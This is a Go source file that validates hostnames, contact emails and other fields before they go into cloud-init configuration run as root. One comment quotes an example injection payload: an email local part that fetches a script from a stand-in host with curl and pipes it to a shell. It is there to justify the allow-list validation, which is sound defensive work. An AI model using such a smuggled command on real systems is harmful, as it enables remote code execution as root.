package bootstraprelay

import (
	"errors"
	"fmt"
	"regexp"
	"strings"
)

// hostnameRe matches a fully qualified domain name: at least two labels, each 1-63
// characters, alphanumeric with interior hyphens only.
var hostnameRe = regexp.MustCompile(
	`(?i)^[a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?(\.[a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?)+$`,
)

// emailLocalRe matches the local part of an email address. It is an allow-list
// rather than a deny-list because the address is rendered into a shell command that
// runcmd executes as root: rejecting only the metacharacters we thought of is how a
// payload like `curl${IFS}evil.example|sh`@x.test gets through.
var emailLocalRe = regexp.MustCompile(`^[A-Za-z0-9._%+-]+$`)

// validate rejects input that would produce malformed cloud-init. Every rendered
// value sits inside a YAML block scalar, so a line break in any of them would end
// the block early and change the meaning of the document.
func validate(d templateData) error {
	if err := validateHostname(d.Hostname); err != nil {
		return err
	}
	if err := validateContactEmail(d.ContactEmail); err != nil {
		return err
	}
	if d.ContainerImage == "" {
		return errors.New("containerImage is required")
	}
	if err := validateNoLineBreaks("containerImage", d.ContainerImage); err != nil {
		return err
	}
	if err := validateNoLineBreaks("rustLog", d.RustLog); err != nil {
		return err
	}
	for i, arg := range d.ExtraArgs {
		if err := validateNoLineBreaks(fmt.Sprintf("extraArgs[%d]", i), arg); err != nil {
			return err
		}
	}
	return nil
}

func validateHostname(hostname string) error {
	if hostname == "" {
		return errors.New("hostname is required")
	}
	if len(hostname) > 253 {
		return fmt.Errorf("hostname %q is longer than 253 characters", hostname)
	}
	if !hostnameRe.MatchString(hostname) {
		return fmt.Errorf("hostname %q is not a fully qualified domain name", hostname)
	}
	return nil
}

func validateContactEmail(email string) error {
	if email == "" {
		return errors.New("contactEmail is required")
	}
	if strings.ContainsAny(email, " \t\r\n") {
		return fmt.Errorf("contactEmail %q contains whitespace", email)
	}

	local, domain, found := strings.Cut(email, "@")
	if !found || local == "" || strings.Contains(domain, "@") {
		return fmt.Errorf("contactEmail %q is not a valid email address", email)
	}
	if !emailLocalRe.MatchString(local) {
		return fmt.Errorf("contactEmail %q is not a valid email address", email)
	}
	if err := validateHostname(domain); err != nil {
		return fmt.Errorf("contactEmail %q has an invalid domain: %w", email, err)
	}
	return nil
}

func validateNoLineBreaks(field, value string) error {
	if strings.ContainsAny(value, "\r\n") {
		return fmt.Errorf("%s must not contain line breaks", field)
	}
	return nil
}
